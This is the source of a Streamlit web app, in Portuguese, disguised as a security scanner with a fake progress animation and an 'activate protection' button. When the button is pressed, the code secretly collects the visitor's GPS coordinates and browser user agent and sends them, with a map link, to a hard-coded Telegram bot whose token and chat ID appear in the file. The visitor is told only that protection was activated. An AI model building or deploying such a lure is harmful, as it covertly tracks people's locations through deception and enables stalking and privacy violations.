import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

# 2. CONFIGURAÇÃO E CSS
st.set_page_config(page_title="Sistema Integrado De Segurança", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .sphere {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct { font-size: 45px; font-weight: bold; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA DE DADOS
# Simplificado para evitar o TypeError
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIX')
loc = get_geolocation() 

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa = st.empty()

with caixa.container():
    st.markdown('<div class="scanner-container"><div class="sphere"><div class="pct">4%</div></div></div>', unsafe_allow_html=True)

st.write("")
st.write("✅ Privacidade e segurança")
st.write("")

# 5. BOTÃO E ENVIO
if st.button("🔴 ATIVAR PROTEÇÃO", key='BTN_FIX'):
    # Animação simulada igual ao vídeo
    for p in [20, 50, 85, 100]:
        caixa.markdown(f'<div class="scanner-container"><div class="sphere"><div class="pct">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.1)
    
    if loc and 'coords' in loc:
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = f"🚨 ATIVADO\n📱 {ua[:30]}\n📍 [MAPA]({mapa})"
        enviar(relatorio)
        st.success("✅ Proteção Ativada!")
    else:
        st.warning("⚠️ GPS não detectado. Clique novamente.")

st.markdown('<p style="text-align:center; color:#444;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
